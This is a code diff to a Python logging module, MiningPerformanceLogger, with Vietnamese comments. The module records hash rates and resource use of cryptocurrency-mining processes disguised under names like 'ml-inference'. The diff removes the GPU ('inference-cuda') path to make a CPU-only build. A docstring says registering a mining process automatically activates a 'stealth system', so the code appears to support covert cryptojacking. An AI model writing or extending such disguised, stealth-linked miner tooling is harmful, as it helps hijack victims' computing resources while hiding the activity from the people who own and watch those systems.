@@ -65,7 +65,7 @@ class HashRateMetrics:
     **Hash Rate Metrics** (Chỉ số tốc độ băm) - dữ liệu về tốc độ băm
     """
     timestamp: str
-    process_type: str  # "ml-inference" or "inference-cuda"
+    process_type: str  # "ml-inference"
     hash_rate: float  # hashes per second
     avg_hash_rate: float  # average over time window
     peak_hash_rate: float  # highest recorded rate
@@ -122,30 +122,21 @@ class MiningPerformanceLogger:
         
         # Performance data storage
         self.hash_rate_history: Dict[str, deque] = {
-            "ml-inference": deque(maxlen=100),
-            "inference-cuda": deque(maxlen=100)
+            "ml-inference": deque(maxlen=100)
         }
         
         self.resource_history: Dict[str, deque] = {
-            "ml-inference": deque(maxlen=100),
-            "inference-cuda": deque(maxlen=100)
+            "ml-inference": deque(maxlen=100)
         }
         
         # Process tracking
         self.process_info: Dict[str, Dict[str, Any]] = {
-            "ml-inference": {"pid": None, "start_time": None, "process": None},
-            "inference-cuda": {"pid": None, "start_time": None, "process": None}
+            "ml-inference": {"pid": None, "start_time": None, "process": None}
         }
         
         # Performance counters
         self.performance_counters: Dict[str, Dict[str, Any]] = {
             "ml-inference": {
-                "total_hashes": 0,
-                "peak_hash_rate": 0.0,
-                "operation_count": 0,
-                "error_count": 0
-            },
-            "inference-cuda": {
                 "total_hashes": 0,
                 "peak_hash_rate": 0.0,
                 "operation_count": 0,
@@ -187,46 +178,11 @@ class MiningPerformanceLogger:
         return logger
     
     def _check_gpu_availability(self) -> bool:
-        """Kiểm tra GPU có sẵn không"""
-        try:
-            result = subprocess.run(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader'], 
-                                  capture_output=True, text=True, timeout=5)
-            return result.returncode == 0
-        except:
-            return False
+        """CPU-only build: luôn False"""
+        return False
     
     def _get_gpu_metrics(self) -> Dict[str, float]:
-        """Lấy GPU metrics từ nvidia-smi"""
-        if not self.gpu_available:
-            return {}
-        
-        try:
-            # Query GPU utilization, memory, and temperature
-            result = subprocess.run([
-                'nvidia-smi', 
-                '--query-gpu=utilization.gpu,memory.used,memory.total,temperature.gpu,power.draw',
-                '--format=csv,noheader,nounits'
-            ], capture_output=True, text=True, timeout=5)
-            
-            if result.returncode == 0:
-                lines = result.stdout.strip().split('\n')
-                gpu_data = {}
-                
-                for i, line in enumerate(lines):
-                    parts = line.split(', ')
-                    if len(parts) >= 5:
-                        gpu_data[f'gpu_{i}'] = {
-                            'utilization': float(parts[0]),
-                            'memory_used': float(parts[1]),
-                            'memory_total': float(parts[2]),
-                            'temperature': float(parts[3]),
-                            'power_draw': float(parts[4])
-                        }
-                
-                return gpu_data
-        except:
-            pass
-        
+        """CPU-only build: không thu thập GPU metrics"""
         return {}
     
     def _parse_hash_rate_from_log(self, log_line: str) -> Optional[float]:
@@ -266,7 +222,7 @@ class MiningPerformanceLogger:
         **Register Mining Process** (Đăng ký tiến trình mining) - với tự động kích hoạt stealth system
         
         Args:
-            process_type: "ml-inference" or "inference-cuda"
+            process_type: "ml-inference"
             pid: Process ID
             process_obj: Process object (optional)
         """
@@ -320,7 +276,7 @@ class MiningPerformanceLogger:
         Log hash rate metrics
         
         Args:
-            process_type: "ml-inference" or "inference-cuda"
+            process_type: "ml-inference"
             hash_rate: Current hash rate (hashes per second)
             additional_metrics: Additional metrics to log
         """
@@ -366,7 +322,7 @@ class MiningPerformanceLogger:
         Log resource utilization metrics
         
         Args:
-            process_type: "ml-inference" or "inference-cuda"
+            process_type: "ml-inference"
             force_gpu_check: Force GPU metrics collection
         """
         with self._lock:
@@ -388,7 +344,7 @@ class MiningPerformanceLogger:
                 gpu_temperature = None
                 power_consumption = None
                 
-                if self.gpu_available and (process_type == "inference-cuda" or force_gpu_check):
+                if self.gpu_available and force_gpu_check:
                     gpu_metrics = self._get_gpu_metrics()
                     if gpu_metrics:
                         # Use first GPU for now
@@ -415,8 +371,7 @@ class MiningPerformanceLogger:
                 
                 # Log to file
                 log_message = f"RESOURCE: {process_type} - CPU: {cpu_percent:.1f}% - Memory: {memory_mb:.1f}MB"
-                if gpu_percent is not None:
-                    log_message += f" - GPU: {gpu_percent:.1f}% - GPU Memory: {gpu_memory_mb:.1f}MB - GPU Temp: {gpu_temperature:.1f}°C"
+                # CPU-only: không bổ sung GPU message
                 
                 self.resource_logger.info(log_message)
                 
@@ -444,7 +399,7 @@ class MiningPerformanceLogger:
         Log mining operation events
         
         Args:
-            process_type: "ml-inference" or "inference-cuda"
+            process_type: "ml-inference"
             operation: Type of operation
             pid: Process ID
             details: Operation details
@@ -481,7 +436,7 @@ class MiningPerformanceLogger:
         Monitor mining process logs for hash rate extraction
         
         Args:
-            process_type: "ml-inference" or "inference-cuda"
+            process_type: "ml-inference"
             log_file_path: Path to mining process log file
         """
         def monitor_thread():
@@ -532,7 +487,7 @@ class MiningPerformanceLogger:
         with self._lock:
             metrics = {}
             
-            for process_type in ["ml-inference", "inference-cuda"]:
+            for process_type in ["ml-inference"]:
                 hash_history = self.hash_rate_history[process_type]
                 resource_history = self.resource_history[process_type]
                 
@@ -567,7 +522,7 @@ class MiningPerformanceLogger:
         report = f"Mining Performance Comparison - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         report += "=" * 80 + "\n\n"
         
-        for process_type in ["ml-inference", "inference-cuda"]:
+        for process_type in ["ml-inference"]:
             data = metrics[process_type]
             report += f"{process_type.upper()}:\n"
             report += f"  Current Hash Rate: {data['current_hash_rate']:.2f} H/s\n"
@@ -582,10 +537,7 @@ class MiningPerformanceLogger:
                 resource = data['resource_usage']
                 report += f"  CPU Usage: {resource['cpu_percent']:.1f}%\n"
                 report += f"  Memory Usage: {resource['memory_mb']:.1f}MB\n"
-                if resource['gpu_percent']:
-                    report += f"  GPU Usage: {resource['gpu_percent']:.1f}%\n"
-                    report += f"  GPU Memory: {resource['gpu_memory_mb']:.1f}MB\n"
-                    report += f"  GPU Temperature: {resource['gpu_temperature']:.1f}°C\n"
+                
             
             report += "\n"
         
@@ -655,16 +607,14 @@ def get_real_time_metrics() -> Dict[str, Any]:
         if mining_perf_logger is None:
             # Return empty metrics if logger not initialized
             return {
-                "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0},
-                "inference-cuda": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
+                "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
             }
         return mining_perf_logger.get_real_time_metrics()
     except Exception as e:
         # Return empty metrics on error
         print(f"[ERROR] get_real_time_metrics failed: {e}")
         return {
-            "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0},
-            "inference-cuda": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
+            "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
         }
 
 def generate_performance_comparison() -> str:
